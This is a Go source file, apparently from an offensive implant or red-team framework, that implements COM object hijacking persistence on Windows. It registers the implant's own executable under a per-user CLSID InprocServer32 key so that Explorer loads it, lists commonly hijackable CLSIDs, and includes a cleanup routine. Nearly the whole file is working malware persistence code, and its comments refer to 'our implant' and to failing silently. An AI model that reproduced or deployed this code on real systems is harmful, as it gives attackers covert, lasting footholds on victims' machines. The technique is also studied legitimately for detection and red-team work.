//go:build windows
// +build windows

// persistence_com_hijack.go - COM Object Hijacking persistence
// Reference: MITRE ATT&CK T1546.015 (COM Hijacking)
//
// Creates a registry entry to hijack a COM object CLSID, redirecting
// it to our implant. HKCU entries take precedence over HKLM.
// Commonly hijacked CLSIDs are those used by explorer.exe on startup.
//
// Note: This file is a standalone snippet for reference. The persistence.py
// module generates this code dynamically for template injection.

package main

import (
	"os"

	"golang.org/x/sys/windows/registry"
)

// Common CLSIDs that can be hijacked for persistence
// These are frequently loaded by Windows components
var hijackableCLSIDs = map[string]string{
	// Thumbcache - loaded by Explorer
	"{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}": "Thumbcache",
	// MMDeviceEnumerator - loaded by audio applications
	"{BCDE0395-E52F-467C-8E3D-C4579291692E}": "MMDeviceEnumerator",
	// EventSystem - loaded by many Windows services
	"{D5978620-5B9F-11D1-8DD2-00AA004ABD5E}": "EventSystem",
}

// installCOMHijackPersistence hijacks a COM object for persistence.
// Reference: MITRE ATT&CK T1546.015 (COM Hijacking)
func installCOMHijackPersistence() error {
	exePath, err := os.Executable()
	if err != nil {
		return err // Silent failure, continue execution
	}

	// COM hijacking via HKCU\Software\Classes\CLSID
	// This takes precedence over HKLM entries
	clsid := "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
	keyPath := `Software\Classes\CLSID\` + clsid + `\InprocServer32`

	// Create the key path
	key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()

	// Set the default value to our executable/DLL
	err = key.SetStringValue("", exePath)
	if err != nil {
		return err
	}

	// Set ThreadingModel (required for COM)
	err = key.SetStringValue("ThreadingModel", "Both")
	if err != nil {
		return err
	}

	return nil
}

// installCOMHijackPersistenceCustom hijacks a specified CLSID.
func installCOMHijackPersistenceCustom(clsid string) error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	keyPath := `Software\Classes\CLSID\` + clsid + `\InprocServer32`

	key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()

	err = key.SetStringValue("", exePath)
	if err != nil {
		return err
	}

	err = key.SetStringValue("ThreadingModel", "Both")
	if err != nil {
		return err
	}

	return nil
}

// removeCOMHijackPersistence removes the COM hijack registry entries.
func removeCOMHijackPersistence() error {
	clsid := "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
	keyPath := `Software\Classes\CLSID\` + clsid
	return registry.DeleteKey(registry.CURRENT_USER, keyPath)
}
